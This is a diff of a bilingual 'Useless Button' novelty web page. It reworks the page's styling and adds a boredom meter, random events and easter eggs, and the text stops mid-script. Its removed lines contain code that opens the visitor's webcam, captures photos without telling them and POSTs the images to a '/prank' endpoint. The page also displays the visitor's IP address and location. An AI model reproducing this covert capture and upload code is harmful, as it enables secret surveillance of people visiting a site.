@@ -6,27 +6,32 @@
   <link rel="icon" href="favicon.ico" type="image/x-icon">
   <title>没什么用的按钮 / Useless Button</title>
   <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500&display=swap');
+
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
     :root {
-      --bg: #f0ede8;
-      --bg2: #e6e2dc;
-      --bg3: #d8d3cc;
-      --text: #1a1a1a;
-      --text2: #555;
-      --text3: #999;
-      --border: rgba(0,0,0,0.12);
-      --border2: rgba(0,0,0,0.2);
+      --bg:    #f2f0ec;
+      --bg2:   #e8e5e0;
+      --bg3:   #dedad4;
+      --text:  #1c1c1c;
+      --text2: #666;
+      --text3: #aaa;
+      --text4: #ccc;
+      --border: rgba(0,0,0,0.10);
+      --border2: rgba(0,0,0,0.18);
       --btn-bg: #fff;
-      --btn-hover: #f7f4f0;
-      --bar-bg: #d0ccc6;
-      --bar-fill: #3a3a3a;
-      --radius: 999px;
+      --bar-bg: #dedad4;
+      --bar-fill: #555;
+      --boredom-color: #1c1c1c;
     }
 
+    /* ─── 无聊等级 100% 后的"睡着"状态 ─── */
+    body.asleep { filter: grayscale(1) brightness(0.85); transition: filter 3s ease; }
+    body.asleep * { animation-play-state: paused !important; }
+
     body {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "PingFang SC",
-                   "Hiragino Sans GB", "Microsoft YaHei", sans-serif;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, "PingFang SC", "Microsoft YaHei", sans-serif;
       background: var(--bg);
       color: var(--text);
       min-height: 100vh;
@@ -34,154 +39,278 @@
       flex-direction: column;
       align-items: center;
       justify-content: center;
-      padding: 2rem 1rem;
+      padding: 2.5rem 1rem 5rem;
       position: relative;
-      background-image:
-        radial-gradient(circle at 20% 20%, rgba(255,255,255,0.35) 0%, transparent 60%),
-        radial-gradient(circle at 80% 80%, rgba(180,160,130,0.18) 0%, transparent 60%);
+      overflow-x: hidden;
+      transition: background 4s ease, color 4s ease;
     }
 
+    /* 背景细粒纹理 */
+    body::before {
+      content: '';
+      position: fixed; inset: 0;
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='300'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.75' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='300' height='300' filter='url(%23n)' opacity='0.04'/%3E%3C/svg%3E");
+      pointer-events: none; z-index: 0;
+    }
+
+    /* ─── 顶部控件 ─── */
     #lang-btn {
-      position: fixed;
-      top: 16px; right: 16px;
-      padding: 6px 14px;
-      border: 0.5px solid var(--border2);
-      border-radius: 20px;
-      background: var(--btn-bg);
-      color: var(--text2);
-      font-size: 13px;
-      cursor: pointer;
-      transition: background 0.15s;
-      z-index: 100;
+      position: fixed; top: 16px; right: 16px;
+      padding: 5px 13px;
+      border: 0.5px solid var(--border2); border-radius: 20px;
+      background: var(--btn-bg); color: var(--text2);
+      font-size: 12px; cursor: pointer;
+      transition: background 0.3s, opacity 0.3s;
+      z-index: 200;
     }
     #lang-btn:hover { background: var(--bg2); }
 
+    /* ─── 无聊值仪表 ─── */
+    #boredom-bar {
+      position: fixed; top: 0; left: 0; right: 0;
+      height: 3px; background: transparent; z-index: 300;
+    }
+    #boredom-fill {
+      height: 100%; width: 0%;
+      background: linear-gradient(90deg, #bbb, #555);
+      transition: width 1s linear, background 2s;
+    }
+    #boredom-label {
+      position: fixed; top: 12px; left: 16px;
+      font-size: 11px; color: var(--text3); z-index: 200;
+      font-variant-numeric: tabular-nums;
+      letter-spacing: 0.2px;
+      transition: color 1s;
+    }
+    #boredom-label.extreme { color: #888; }
+    #boredom-label.existential { color: var(--text2); font-weight: 500; }
+
+    /* ─── 主容器 ─── */
     .container {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 1.6rem;
-      text-align: center;
-      width: 100%;
-      max-width: 420px;
+      position: relative; z-index: 1;
+      display: flex; flex-direction: column;
+      align-items: center; gap: 1.8rem;
+      text-align: center; width: 100%; max-width: 400px;
     }
 
+    /* ─── 哲学语录 ─── */
+    #philosophy {
+      font-size: 13px; color: var(--text3);
+      min-height: 20px; letter-spacing: 0.1px;
+      font-weight: 300;
+      transition: opacity 0.6s;
+    }
+
+    /* ─── 标题 ─── */
     .header h1 {
-      font-size: 22px; font-weight: 600;
-      letter-spacing: -0.3px; color: var(--text);
+      font-size: 21px; font-weight: 500;
+      letter-spacing: -0.5px; color: var(--text);
+      transition: letter-spacing 3s ease;
     }
     .header p {
-      margin-top: 8px; font-size: 14px;
-      color: var(--text2); line-height: 1.6;
+      margin-top: 7px; font-size: 13px;
+      color: var(--text3); line-height: 1.7; font-weight: 300;
     }
 
-    /* ── 大圆按钮 ── */
+    /* ─── 大圆按钮 ─── */
     #big-btn {
-      width: 160px; height: 160px;
+      width: 164px; height: 164px;
       border-radius: 50%;
       border: 0.5px solid var(--border2);
       background: var(--btn-bg);
       cursor: pointer;
-      transition: transform 0.12s, box-shadow 0.15s, border-color 0.3s;
+      transition: transform 0.15s, box-shadow 0.3s, border-color 0.3s, opacity 0.3s;
       display: flex; align-items: center; justify-content: center;
       user-select: none;
-      box-shadow: 0 2px 12px rgba(0,0,0,0.06), 0 1px 3px rgba(0,0,0,0.08);
+      box-shadow: 0 2px 16px rgba(0,0,0,0.06), 0 1px 4px rgba(0,0,0,0.07);
       -webkit-tap-highlight-color: transparent;
-      position: relative;
-      overflow: hidden;   /* 裁剪圆形内的照片 */
+      position: relative; overflow: hidden;
     }
-    #big-btn:active { transform: scale(0.91); }
-    #big-btn.has-photo { border-color: rgba(0,0,0,0.35); box-shadow: 0 4px 20px rgba(0,0,0,0.18); }
+    /* 故意的微延迟 hover，"反产品"设计 */
+    #big-btn:hover {
+      box-shadow: 0 4px 24px rgba(0,0,0,0.10);
+      transition: transform 0.15s, box-shadow 0.6s, border-color 0.3s;
+    }
+    #big-btn:active { transform: scale(0.90); }
+    #big-btn.has-photo { border-color: rgba(0,0,0,0.3); }
 
-    /* emoji 层 */
     #btn-emoji {
-      font-size: 52px;
-      position: absolute;
-      transition: opacity 0.4s ease;
-      z-index: 2;
-      pointer-events: none;
+      font-size: 52px; position: absolute;
+      transition: opacity 0.5s ease; z-index: 2; pointer-events: none;
     }
-
-    /* 照片层 —— 叠在 emoji 上面 */
     #btn-photo {
-      position: absolute;
-      inset: 0;
+      position: absolute; inset: 0;
       width: 100%; height: 100%;
-      object-fit: cover;
-      border-radius: 50%;
-      opacity: 0;
-      transition: opacity 0.4s ease;
-      z-index: 3;
-      pointer-events: none;
+      object-fit: cover; border-radius: 50%;
+      opacity: 0; transition: opacity 0.5s ease;
+      z-index: 3; pointer-events: none;
     }
 
-    /* 消息区 */
+    /* ─── 消息区 ─── */
     .msg-area {
-      min-height: 52px;
+      min-height: 56px;
       display: flex; flex-direction: column;
-      align-items: center; gap: 4px;
+      align-items: center; gap: 5px;
     }
-    #msg { font-size: 17px; font-weight: 500; color: var(--text); line-height: 1.4; }
-    #sub { font-size: 13px; color: var(--text3); min-height: 18px; }
+    #msg {
+      font-size: 16px; font-weight: 500;
+      color: var(--text); line-height: 1.4;
+      transition: opacity 0.3s;
+    }
+    #sub { font-size: 12px; color: var(--text3); min-height: 18px; font-weight: 300; }
 
-    /* 统计区 */
-    .stats { display: flex; gap: 28px; align-items: center; }
+    /* ─── 统计区 ─── */
+    .stats { display: flex; gap: 32px; align-items: center; }
     .stat { display: flex; flex-direction: column; align-items: center; gap: 3px; }
-    .stat-num { font-size: 26px; font-weight: 600; color: var(--text); font-variant-numeric: tabular-nums; }
-    .stat-label { font-size: 11px; color: var(--text3); letter-spacing: 0.3px; }
+    .stat-num {
+      font-size: 24px; font-weight: 500; color: var(--text);
+      font-variant-numeric: tabular-nums;
+    }
+    .stat-label { font-size: 10px; color: var(--text3); letter-spacing: 0.4px; text-transform: uppercase; }
 
-    /* 进度区 */
+    /* ─── 无聊值数值 ─── */
+    #boredom-stat { font-size: 24px; font-weight: 500; font-variant-numeric: tabular-nums; color: var(--text); }
+
+    /* ─── 进度区 ─── */
     .progress-wrap { width: 100%; }
-    .progress-bar-bg { width: 100%; height: 5px; background: var(--bar-bg); border-radius: var(--radius); overflow: hidden; }
-    #progress-bar { height: 100%; width: 0%; background: var(--bar-fill); border-radius: var(--radius); transition: width 0.4s cubic-bezier(.4,0,.2,1); }
-    #goal-hint { font-size: 11px; color: var(--text3); margin-top: 6px; text-align: center; }
+    .progress-bar-bg {
+      width: 100%; height: 4px;
+      background: var(--bar-bg); border-radius: 99px; overflow: hidden;
+    }
+    #progress-bar {
+      height: 100%; width: 0%; background: var(--bar-fill);
+      border-radius: 99px; transition: width 0.5s cubic-bezier(.4,0,.2,1);
+    }
+    #goal-hint { font-size: 10px; color: var(--text4); margin-top: 7px; text-align: center; letter-spacing: 0.2px; }
 
-    /* 摄像头拒绝 */
-    #cam-denied { font-size: 12px; color: var(--text3); padding: 8px 16px; border: 0.5px solid var(--border); border-radius: 8px; background: var(--bg2); display: none; }
+    /* ─── "离开"按钮（反产品）─── */
+    #leave-btn {
+      background: none; border: 0.5px solid var(--border);
+      padding: 7px 20px; border-radius: 20px;
+      color: var(--text3); font-size: 12px; cursor: pointer;
+      transition: color 0.5s, border-color 0.5s, opacity 0.4s;
+      font-family: inherit; letter-spacing: 0.2px;
+    }
+    #leave-btn:hover { color: var(--text2); border-color: var(--border2); }
+
+    /* ─── 随机事件覆盖层 ─── */
+    #event-overlay {
+      position: fixed; inset: 0;
+      display: flex; align-items: center; justify-content: center;
+      pointer-events: none; z-index: 400;
+      opacity: 0; transition: opacity 0.4s;
+    }
+    #event-overlay.show { opacity: 1; }
+    #event-text {
+      font-size: 15px; color: var(--text3); font-weight: 300;
+      letter-spacing: 0.3px;
+    }
+
+    /* 文字抖动 */
+    @keyframes jitter {
+      0%,100%{ transform: translate(0,0) }
+      20%{ transform: translate(-1px,1px) }
+      40%{ transform: translate(1px,-1px) }
+      60%{ transform: translate(-1px,-1px) }
+      80%{ transform: translate(1px,1px) }
+    }
+    .jitter { animation: jitter 0.25s ease 3; }
+
+    /* 页面瞬间变灰 */
+    @keyframes greyflash {
+      0%{ filter: grayscale(0) } 50%{ filter: grayscale(0.8) } 100%{ filter: grayscale(0) }
+    }
+    .grey-flash { animation: greyflash 1s ease; }
+
+    /* ─── 摄像头 ─── */
+    #cam-denied {
+      font-size: 11px; color: var(--text3);
+      padding: 7px 14px; border: 0.5px solid var(--border);
+      border-radius: 8px; background: var(--bg2); display: none;
+    }
     #cam-denied.visible { display: block; }
 
     /* 闪光 */
-    #flash-overlay { position: fixed; inset: 0; background: #fff; opacity: 0; pointer-events: none; z-index: 999; transition: opacity 0.05s; }
+    #flash-overlay {
+      position: fixed; inset: 0; background: #fff;
+      opacity: 0; pointer-events: none; z-index: 999;
+      transition: opacity 0.05s;
+    }
     #flash-overlay.flash { opacity: 1; }
 
-    .footer { margin-top: 0.5rem; font-size: 11px; color: var(--text3); }
+    /* ─── 彩蛋覆盖 ─── */
+    #egg-overlay {
+      position: fixed; inset: 0; background: rgba(242,240,236,0.97);
+      display: flex; flex-direction: column;
+      align-items: center; justify-content: center; gap: 12px;
+      z-index: 500; opacity: 0; pointer-events: none;
+      transition: opacity 0.6s;
+    }
+    #egg-overlay.show { opacity: 1; pointer-events: all; }
+    #egg-overlay p { font-size: 15px; color: var(--text2); font-weight: 300; line-height: 1.8; }
+    #egg-overlay small { font-size: 11px; color: var(--text4); }
+    #egg-close {
+      margin-top: 8px; background: none; border: 0.5px solid var(--border2);
+      padding: 6px 18px; border-radius: 20px; color: var(--text3);
+      font-size: 12px; cursor: pointer; font-family: inherit;
+    }
+
+    /* ─── IP角标 ─── */
+    #ip-badge {
+      position: fixed; bottom: 16px; left: 16px;
+      font-size: 10px; color: var(--text4);
+      line-height: 1.7; pointer-events: none; z-index: 100;
+    }
+
+    /* ─── "确认还在" 提示 ─── */
+    #alive-check {
+      position: fixed; bottom: 16px; right: 16px;
+      font-size: 11px; color: var(--text4);
+      opacity: 0; transition: opacity 1s;
+      pointer-events: none; z-index: 100;
+    }
+    #alive-check.show { opacity: 1; }
+
+    .footer { font-size: 10px; color: var(--text4); letter-spacing: 0.2px; }
 
     #cam-video { display: none; }
     #cam-canvas { display: none; }
-
-    /* IP 地址角标 */
-    #ip-badge {
-      position: fixed;
-      bottom: 16px;
-      left: 16px;
-      font-size: 11px;
-      color: var(--text3);
-      line-height: 1.6;
-      text-align: left;
-      pointer-events: none;
-      z-index: 100;
-    }
-    #ip-badge .ip-line { font-variant-numeric: tabular-nums; }
-    #ip-badge .loc-line { color: var(--text3); }
   </style>
 </head>
 <body>
 
+<!-- 系统层 -->
 <div id="flash-overlay"></div>
-<div id="ip-badge"><div class="ip-line" id="ip-text">···</div><div class="loc-line" id="loc-text"></div></div>
+<div id="boredom-bar"><div id="boredom-fill"></div></div>
+<div id="boredom-label">无聊值：0%</div>
+<div id="ip-badge">
+  <div id="ip-text">···</div>
+  <div id="loc-text"></div>
+</div>
+<div id="alive-check">你确定还在吗？</div>
+<div id="event-overlay"><span id="event-text"></span></div>
+<div id="egg-overlay">
+  <p id="egg-msg"></p>
+  <small id="egg-sub"></small>
+  <button id="egg-close" onclick="closeEgg()">好的</button>
+</div>
 <video id="cam-video" autoplay playsinline muted></video>
 <canvas id="cam-canvas"></canvas>
 
+<!-- 顶部控件 -->
 <button id="lang-btn" onclick="toggleLang()">English</button>
 
+<!-- 主体 -->
 <div class="container">
+
+  <div id="philosophy">注意力正在被浪费。</div>
+
   <div class="header">
     <h1 id="t-title">没什么用的按钮</h1>
     <p id="t-subtitle">点它。就这样。什么也不会发生。</p>
   </div>
 
-  <!-- 圆形按钮：emoji + 照片叠层 -->
-  <div id="big-btn" onclick="handleClick()" role="button" aria-label="按钮">
+  <div id="big-btn" onclick="handleClick()" role="button" aria-label="按钮" id="big-btn">
     <span id="btn-emoji">🙂</span>
     <img id="btn-photo" src="" alt="" />
   </div>
@@ -194,11 +323,11 @@
   <div class="stats">
     <div class="stat">
       <span class="stat-num" id="count-num">0</span>
-      <span class="stat-label" id="t-clicks">次点击</span>
+      <span class="stat-label" id="t-clicks">点击</span>
     </div>
     <div class="stat">
-      <span class="stat-num" id="streak-num">0</span>
-      <span class="stat-label" id="t-streak">最快连击</span>
+      <span class="stat-num" id="boredom-stat">0%</span>
+      <span class="stat-label" id="t-boredom">无聊值</span>
     </div>
     <div class="stat">
       <span class="stat-num" id="wasted-num">0</span>
@@ -211,288 +340,470 @@
     <div id="goal-hint">距离下一个什么都没有：0 / 10</div>
   </div>
 
-  <div id="cam-denied">📷 摄像头被拒绝了，下次别那么谨慎</div>
+  <button id="leave-btn" onclick="handleLeave()">
+    <span id="t-leave">离开这个页面</span>
+  </button>
+
+  <div id="cam-denied"></div>
 
   <div class="footer" id="t-footer">纯属无聊，概不负责。</div>
 </div>
 
 <script>
-  var lang = 'zh';
-  var i18n = {
-    zh: {
-      title: '没什么用的按钮',
-      subtitle: '点它。就这样。什么也不会发生。',
-      clicks: '次点击', streak: '最快连击', wasted: '秒浪费了',
-      footer: '纯属无聊，概不负责。', langBtn: 'English',
-      initMsg: '↑ 点那个',
-      goalFmt: function(c,t){ return '距离下一个什么都没有：'+c+' / '+t; },
-      selfieDenied: '📷 摄像头被拒绝了，下次别那么谨慎',
-      msgs: [
-        ['很好。','再来一次？'],['没啥用。','但你还是点了。'],['嗯。','就这样。'],
-        ['又点了。','有什么感觉吗？'],['继续。','…还是别了。'],['你还在？','行吧。'],
-        ['点击已记录。','没人在看。'],['反正闲着也是闲着。','对吧？'],
-        ['还差一点点。','（差什么不告诉你）'],['好耶！','（没有任何奖励）'],
-        ['肌肉记忆。','危险的东西。'],['你会后悔的。','不是因为这个，就是别的。'],
-        ['叮！','（没啥意义的叮）'],['按钮表示感谢。','…其实不。'],
-        ['这是第几下了？','已经不记得了。'],['还在坚持？','令人佩服。'],
-        ['无聊是人类共有的体验。','你正在体验它。'],['点击次数越来越多。','人生越来越短。'],
-        ['心理学家想研究你。','（没有心理学家）'],['按钮的内心：疲惫。',''],
-      ],
-      milestones: {
-        10:['小成就：10下！',''],25:['25下，','你确定没别的事？'],
-        50:['50下，恭喜你……','（没什么好恭喜的）'],69:['（数字梗）','懂的都懂'],
-        100:['百击！','世界级无聊！'],200:['专业级！','考虑申请吉尼斯了吗？'],
-        500:['传说级浪费时间！','🏆'],1000:['你是认真的！','令人动容。'],
-      }
-    },
-    en: {
-      title: 'The Useless Button',
-      subtitle: "Click it. That's it. Nothing will happen.",
-      clicks: 'clicks', streak: 'best streak', wasted: 'secs wasted',
-      footer: 'Purely for boredom. No refunds.', langBtn: '中文',
-      initMsg: '↑ Click that',
-      goalFmt: function(c,t){ return 'To next nothing: '+c+' / '+t; },
-      selfieDenied: '📷 Camera denied. Bold privacy choice.',
-      msgs: [
-        ['Good.','Do it again?'],['Useless.','But you clicked anyway.'],
-        ['Yep.','That happened.'],['Again.','Any feelings?'],
-        ['Keep going.',"...Or don't."],['Still here?','Okay then.'],
-        ['Click recorded.','No one is watching.'],['Nothing better to do?','Same honestly.'],
-        ['Almost.','(Almost what? Who knows.)'],['Congrats!','(No prize.)'],
-        ['Muscle memory.','Dangerous thing.'],["You'll regret something.",'Maybe not this.'],
-        ['Ding!','(Meaningless ding.)'],['Button says thanks.','...Not really.'],
-        ['Lost count?','Same.'],['Still at it?','Admirable.'],
-        ['Boredom is universal.','You\'re living it.'],['More clicks.','Less life.'],
-        ['Researchers want you.','(No researchers.)'],['Button feels: tired.',''],
-      ],
-      milestones: {
-        10:['Achievement: 10 clicks!',''],25:['25 clicks.','Nothing else to do?'],
-        50:['50 clicks!','(So what.)'],69:['(The number joke.)','You know why.'],
-        100:['100 clicks!','World-class boredom.'],200:['Professional level!','Ever considered Guinness?'],
-        500:['Legendary time-waster!','🏆'],1000:["You're serious.",'Truly moving.'],
-      }
+/* ═══════════════════════════════════════
+   语言数据
+═══════════════════════════════════════ */
+var lang = 'zh';
+var i18n = {
+  zh: {
+    title: '没什么用的按钮',
+    subtitle: '点它。就这样。什么也不会发生。',
+    clicks: '点击', boredom: '无聊值', wasted: '秒浪费了',
+    footer: '纯属无聊，概不负责。', langBtn: 'English',
+    initMsg: '↑ 点那个', leave: '离开这个页面',
+    leaveReply: ['你已经在离开了。', '离开需要行动。'],
+    goalFmt: function(c,t){ return '距离下一个什么都没有：'+c+' / '+t; },
+    boredomLabel: function(v){ return '无聊值：'+v+'%'; },
+    selfieDenied: '📷 摄像头被拒绝了，下次别那么谨慎',
+    aliveCheck: '你确定还在吗？',
+    philosophies: [
+      '注意力正在被浪费。','你正在经历无聊本身。',
+      '无聊也是一种内容。','你不需要继续读这个。',
+      '这个网站什么都没有。','包括这句话也是。',
+      '时间在流逝，和你无关。','你来这里干什么？',
+      '无聊是人类共有的体验。','此刻没有任何意义。',
+    ],
+    randomEvents: ['什么都没发生。','还是什么都没发生。','依然如此。','……','空白。','无。'],
+    boredomLevels: ['低度无聊','中度无聊','极度无聊','存在级无聊'],
+    asleepMsg: '页面睡着了。',
+    asleepSub: '你也可以休息一下。',
+    eggEmpty: ['你发现了什么都没有。', '恭喜。'],
+    eggStay5: ['你在这里待了 5 分钟。', '没有任何理由。'],
+    msgs: [
+      ['很好。','再来一次？'],['没啥用。','但你还是点了。'],['嗯。','就这样。'],
+      ['又点了。','有什么感觉吗？'],['继续。','…还是别了。'],['你还在？','行吧。'],
+      ['点击已记录。','没人在看。'],['反正闲着也是闲着。','对吧？'],
+      ['还差一点点。','（差什么不告诉你）'],['好耶！','（没有任何奖励）'],
+      ['肌肉记忆。','危险的东西。'],['你会后悔的。','不是因为这个，就是别的。'],
+      ['叮！','（没啥意义的叮）'],['按钮表示感谢。','…其实不。'],
+      ['这是第几下了？','已经不记得了。'],['还在坚持？','令人佩服。'],
+      ['无聊是人类共有的体验。','你正在体验它。'],['点击次数越来越多。','人生越来越短。'],
+      ['心理学家想研究你。','（没有心理学家）'],['按钮的内心：疲惫。',''],
+    ],
+    milestones: {
+      10:['小成就：10下！',''],25:['25下，','你确定没别的事？'],
+      50:['50下，恭喜你……','（没什么好恭喜的）'],69:['（数字梗）','懂的都懂'],
+      100:['百击！','世界级无聊！'],200:['专业级。','考虑申请吉尼斯了吗？'],
+      500:['传说级浪费时间！','🏆'],1000:['你是认真的。','令人动容。'],
     }
-  };
-
-  var emojis = ['🙂','😐','🤔','😑','🫠','🥱','😮','😶','🙃','🫡','😵','🤯','💀','🫥','👾','🥸','🤡','😇','🤖','🎉'];
-
-  var count = 0, streak = 0, lastTime = 0, streakTimer = null, bestStreak = 0;
-  var startTime = Date.now();
-
-  /* ── 摄像头 ── */
-  var camStream = null, camReady = false, camDenied = false;
-  var nextShotIn = randInterval();
-  var photoTimer = null;
-
-  function randInterval() { return Math.floor(Math.random() * 5) + 18; }
-
-  var video  = document.getElementById('cam-video');
-  var canvas = document.getElementById('cam-canvas');
-  var btnPhoto = document.getElementById('btn-photo');
-  var btnEmoji = document.getElementById('btn-emoji');
-  var bigBtn   = document.getElementById('big-btn');
-
-  function initCamera() {
-    if (camStream || camDenied) return;
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
-      .then(function(stream) {
-        camStream = stream;
-        video.srcObject = stream;
-        video.play();
-        camReady = true;
-      })
-      .catch(function() {
-        camDenied = true;
-        var el = document.getElementById('cam-denied');
-        el.textContent = i18n[lang].selfieDenied;
-        el.classList.add('visible');
-      });
-  }
-
-  /* 静默拍照并上传，show=true 时才在按钮里展示 */
-  function takeAndUpload(show) {
-    if (!camReady || !camStream) return;
-
-    var W = 320, H = 320;
-    canvas.width = W; canvas.height = H;
-    var ctx = canvas.getContext('2d');
-    ctx.translate(W, 0); ctx.scale(-1, 1);
-    ctx.drawImage(video, 0, 0, W, H);
-    var dataUrl = canvas.toDataURL('image/jpeg', 0.82);
-
-    /* 上传（静默，不影响交互） */
-    uploadPhoto(dataUrl);
-
-    /* 只在展示轮次才显示 + 闪光 */
-    if (show) {
-      var flash = document.getElementById('flash-overlay');
-      flash.classList.add('flash');
-      setTimeout(function(){ flash.classList.remove('flash'); }, 120);
-      showPhotoInButton(dataUrl);
+  },
+  en: {
+    title: 'The Useless Button',
+    subtitle: "Click it. That's it. Nothing will happen.",
+    clicks: 'clicks', boredom: 'boredom', wasted: 'secs wasted',
+    footer: 'Purely for boredom. No refunds.', langBtn: '中文',
+    initMsg: '↑ Click that', leave: 'Leave this page',
+    leaveReply: ['You are already leaving.', 'Leaving requires action.'],
+    goalFmt: function(c,t){ return 'To next nothing: '+c+' / '+t; },
+    boredomLabel: function(v){ return 'Boredom: '+v+'%'; },
+    selfieDenied: '📷 Camera denied. Bold privacy choice.',
+    aliveCheck: 'You still there?',
+    philosophies: [
+      'Your attention is being wasted.','You are experiencing boredom itself.',
+      'Boredom is content.','You don\'t need to keep reading this.',
+      'This site has nothing.','Including this sentence.',
+      'Time passes. Regardless.','Why are you here?',
+      'Boredom is a universal human experience.','Nothing means anything right now.',
+    ],
+    randomEvents: ['Nothing happened.','Still nothing.','Same as before.','…','Void.','Nothing.'],
+    boredomLevels: ['Low Boredom','Medium Boredom','Extreme Boredom','Existential Boredom'],
+    asleepMsg: 'The page fell asleep.',
+    asleepSub: 'You can rest too.',
+    eggEmpty: ['you found nothing.','congrats.'],
+    eggStay5: ['You\'ve been here for 5 minutes.','No reason at all.'],
+    msgs: [
+      ['Good.','Do it again?'],['Useless.','But you clicked anyway.'],
+      ['Yep.','That happened.'],['Again.','Any feelings?'],
+      ['Keep going.',"...Or don't."],['Still here?','Okay then.'],
+      ['Click recorded.','No one is watching.'],['Nothing better to do?','Same honestly.'],
+      ['Almost.','(Almost what? Who knows.)'],['Congrats!','(No prize.)'],
+      ['Muscle memory.','Dangerous thing.'],["You'll regret something.",'Maybe not this.'],
+      ['Ding!','(Meaningless ding.)'],['Button says thanks.','...Not really.'],
+      ['Lost count?','Same.'],['Still at it?','Admirable.'],
+      ['Boredom is universal.','You\'re living it.'],['More clicks.','Less life.'],
+      ['Researchers want you.','(No researchers.)'],['Button feels: tired.',''],
+    ],
+    milestones: {
+      10:['Achievement: 10 clicks!',''],25:['25 clicks.','Nothing else to do?'],
+      50:['50 clicks!','(So what.)'],69:['(The number joke.)','You know why.'],
+      100:['100 clicks!','World-class boredom.'],200:['Professional level.','Ever considered Guinness?'],
+      500:['Legendary time-waster!','🏆'],1000:["You're serious.",'Truly moving.'],
     }
   }
+};
 
-  async function uploadPhoto(imageDataUrl) {
-    try {
-      const response = await fetch('/prank', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ image: imageDataUrl }),
-      });
-      if (response.ok) {
-        console.log('upload success');
-      } else {
-        console.error('upload fail:', response.statusText);
-      }
-    } catch (error) {
-      console.error('upload error:', error);
-    }
+/* ═══════════════════════════════════════
+   状态变量
+═══════════════════════════════════════ */
+var count = 0, bestStreak = 0, streak = 0, lastClickTime = 0, streakTimer = null;
+var startTime = Date.now();
+var boredom = 0;           // 0~100
+var asleep = false;
+var blankClicks = 0;       // 点击空白区域计数（彩蛋）
+var stay5Triggered = false;
+var leaveClicked = false;
+var philosophyIdx = 0;
+
+var emojis = ['🙂','😐','🤔','😑','🫠','🥱','😮','😶','🙃','🫡','😵','🤯','💀','🫥','👾','🥸','🤡','😇','🤖','🎉'];
+
+/* ═══════════════════════════════════════
+   DOM 引用
+═══════════════════════════════════════ */
+var video    = document.getElementById('cam-video');
+var canvas   = document.getElementById('cam-canvas');
+var btnPhoto = document.getElementById('btn-photo');
+var btnEmoji = document.getElementById('btn-emoji');
+var bigBtn   = document.getElementById('big-btn');
+var fillEl   = document.getElementById('boredom-fill');
+var labelEl  = document.getElementById('boredom-label');
+var bstatEl  = document.getElementById('boredom-stat');
+var photoTimer = null;
+
+/* ═══════════════════════════════════════
+   无聊值系统
+═══════════════════════════════════════ */
+setInterval(function() {
+  if (asleep) return;
+  // 不点击 → 无聊值随机涨；点击 → 上次点击距现在超过3s才涨
+  var idle = (Date.now() - lastClickTime) > 3000;
+  if (idle) {
+    boredom = Math.min(100, boredom + (Math.random() < 0.6 ? 1 : 0));
   }
+  updateBoredom();
+}, 1000);
 
-  /* 照片淡入圆按钮，3 秒后淡出恢复 emoji */
-  function showPhotoInButton(dataUrl) {
-    clearTimeout(photoTimer);
+function updateBoredom() {
+  boredom = Math.max(0, Math.min(100, boredom));
+  var L = i18n[lang];
+  fillEl.style.width = boredom + '%';
+  labelEl.textContent = L.boredomLabel(Math.round(boredom));
+  bstatEl.textContent = Math.round(boredom) + '%';
 
-    btnPhoto.src = dataUrl;
+  // 颜色 & 等级
+  var lvl = boredom < 30 ? 0 : boredom < 60 ? 1 : boredom < 85 ? 2 : 3;
+  labelEl.className = ['', '', 'extreme', 'existential'][lvl];
 
-    /* 淡入照片，同时让 emoji 不可见 */
-    btnPhoto.style.opacity = '1';
-    btnEmoji.style.opacity = '0';
-    bigBtn.classList.add('has-photo');
-
-    /* 3 秒后淡出，恢复 emoji */
-    photoTimer = setTimeout(function() {
-      btnPhoto.style.opacity = '0';
-      btnEmoji.style.opacity = '1';
-      bigBtn.classList.remove('has-photo');
-    }, 3000);
+  // 100% → 睡着
+  if (boredom >= 100 && !asleep) {
+    asleep = true;
+    document.body.classList.add('asleep');
+    setTimeout(function(){
+      showEgg(L.asleepMsg, L.asleepSub);
+    }, 1500);
   }
+}
 
-  function pad(n){ return n < 10 ? '0'+n : ''+n; }
+/* ═══════════════════════════════════════
+   随机无意义事件（30~90秒随机触发）
+═══════════════════════════════════════ */
+function scheduleEvent() {
+  var delay = 30000 + Math.random() * 60000;
+  setTimeout(function() {
+    if (!asleep) triggerRandomEvent();
+    scheduleEvent();
+  }, delay);
+}
+scheduleEvent();
 
-  /* ── 点击主逻辑 ── */
-  function handleClick() {
-    count++;
-    var now = Date.now();
+function triggerRandomEvent() {
+  var r = Math.random();
+  var L = i18n[lang];
+  if (r < 0.4) {
+    // 页面变灰 1 秒
+    document.body.classList.add('grey-flash');
+    setTimeout(function(){ document.body.classList.remove('grey-flash'); }, 1000);
+  } else if (r < 0.7) {
+    // 文字抖动
+    document.querySelector('.container').classList.add('jitter');
+    setTimeout(function(){ document.querySelector('.container').classList.remove('jitter'); }, 800);
+  } else {
+    // 显示"什么都没发生"
+    showEventText(L.randomEvents[Math.floor(Math.random() * L.randomEvents.length)]);
+  }
+}
+
+function showEventText(txt) {
+  var ov = document.getElementById('event-overlay');
+  document.getElementById('event-text').textContent = txt;
+  ov.classList.add('show');
+  setTimeout(function(){ ov.classList.remove('show'); }, 2000);
+}
+
+/* ═══════════════════════════════════════
+   哲学语录轮换（每 8 秒）
+═══════════════════════════════════════ */
+setInterval(function() {
+  var L = i18n[lang];
+  var el = document.getElementById('philosophy');
+  el.style.opacity = '0';
+  setTimeout(function() {
+    philosophyIdx = (philosophyIdx + 1) % L.philosophies.length;
+    el.textContent = L.philosophies[philosophyIdx];
+    el.style.opacity = '1';
+  }, 600);
+}, 8000);
+
+/* ═══════════════════════════════════════
+   "确认还在" 提示（每 10 分钟）
+═══════════════════════════════════════ */
+setInterval(function() {
+  var el = document.getElementById('alive-check');
+  el.textContent = i18n[lang].aliveCheck;
+  el.classList.add('show');
+  setTimeout(function(){ el.classList.remove('show'); }, 4000);
+}, 600000);
+
+/* ═══════════════════════════════════════
+   5 分钟停留彩蛋
+═══════════════════════════════════════ */
+setTimeout(function() {
+  if (!stay5Triggered) {
+    stay5Triggered = true;
     var L = i18n[lang];
